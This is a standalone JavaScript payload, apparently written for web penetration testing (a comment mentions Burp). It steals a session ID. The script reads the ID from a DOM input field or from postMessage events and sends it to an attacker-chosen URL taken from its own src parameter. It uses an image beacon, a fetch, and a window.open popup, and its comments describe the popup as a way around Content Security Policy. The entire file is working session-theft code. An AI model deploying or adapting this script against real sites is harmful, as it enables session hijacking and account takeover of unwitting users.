(function() {                                                                                                                                        
      // Get exfil URL from script's own src attribute
      const scripts = document.getElementsByTagName('script');                                                                                         
      let exfilUrl = null;                                                                                                                             
      let fromContext = null;                                                                                                                          
                                                                                                                                                       
      // Find this script's src                                                                                                                        
      for (let i = scripts.length - 1; i >= 0; i--) {                                                                                                  
          const src = scripts[i].src;                                                                                                                  
          if (src && src.includes('session-id-exfil.js')) {                                                                                            
              const scriptUrl = new URL(src);                                                                                                          
              exfilUrl = scriptUrl.searchParams.get('exfil');                                                                                          
              fromContext = scriptUrl.searchParams.get('from');                                                                                        
              break;                                                                                                                                   
          }                                                                                                                                            
      }                                                                                                                                                
                                                                                                                                                       
      console.log('[Exfil Script] Loaded - Searching for Session ID...');                                                                              
      console.log('[Exfil Script] Exfil URL:', exfilUrl);                                                                                              
      console.log('[Exfil Script] From context:', fromContext);                                                                                        
                                                                                                                                                       
      // Method 1: Read from DOM                                                                                                                       
      const sessionIdInput = document.getElementById('apiSessionId');                                                                                  
      if (sessionIdInput && sessionIdInput.value) {                                                                                                    
          console.log('[EXFIL] Found Session ID in DOM:', sessionIdInput.value);                                                                       
          exfiltrate(sessionIdInput.value, fromContext || 'dom');                                                                                      
      } else {                                                                                                                                         
          console.log('[EXFIL] No Session ID found in DOM');                                                                                           
      }                                                                                                                                                
                                                                                                                                                       
      // Method 2: Listen for postMessage                                                                                                              
      console.log('[Exfil Script] Listening for postMessage...');                                                                                      
      window.addEventListener('message', function(event) {                                                                                             
          if (event.data && event.data.type === 'sessionId' && event.data.value) {                                                                     
              console.log('[EXFIL] Received Session ID via postMessage:', event.data.value);                                                           
              exfiltrate(event.data.value, 'postmessage');                                                                                             
          }                                                                                                                                            
      });                                                                                                                                              
                                                                                                                                                       
      function exfiltrate(data, source) {                                                                                                              
          if (!exfilUrl) {                                  
              console.log('[EXFIL] No exfil URL provided, data captured but not sent:', data);                                                         
              return;                                                                                                                                  
          }                                                                                                                                            
                                                                                                                                                       
          console.log('[EXFIL] Attempting exfiltration...');                                                                                           
                                                            
          // Method 1: Image (shows in Burp as HTTP GET request)                                                                                       
          try {                                             
              const img = new Image();                                                                                                                 
              img.src = exfilUrl + encodeURIComponent(data) + '&source=' + source;                                                                     
              console.log('[EXFIL] Image exfil attempted:', img.src);                                                                                  
          } catch(e) {                                                                                                                                 
              console.error('[EXFIL] Image exfil failed:', e);                                                                                         
          }                                                                                                                                            
                                                                                                                                                       
          // Method 2: fetch (will be blocked by CSP but try anyway)                                                                                   
          try {                                             
              fetch(exfilUrl + encodeURIComponent(data) + '&source=' + source, {                                                                       
                  mode: 'no-cors'                                                                                                                      
              });                                                                                                                                      
              console.log('[EXFIL] Fetch attempted');                                                                                                  
          } catch(e) {                                                                                                                                 
              console.error('[EXFIL] Fetch failed:', e);                                                                                               
          }                                                                                                                                            
                                                                                                                                                       
          // Method 3: window.open (bypasses CSP, as backup)                                                                                           
          try {                                                                                                                                        
              const url = exfilUrl + encodeURIComponent(data) + '&source=' + source;                                                                   
              const popup = window.open(url, '_blank');                                                                                                
              console.log('[EXFIL] window.open executed:', url);                                                                                       
              if (popup) setTimeout(() => popup.close(), 500);                                                                                         
          } catch(e) {                                                                                                                                 
              console.error('[EXFIL] window.open failed:', e);                                                                                         
          }                                                                                                                                            
      }                                                                                                                                                
  })();   
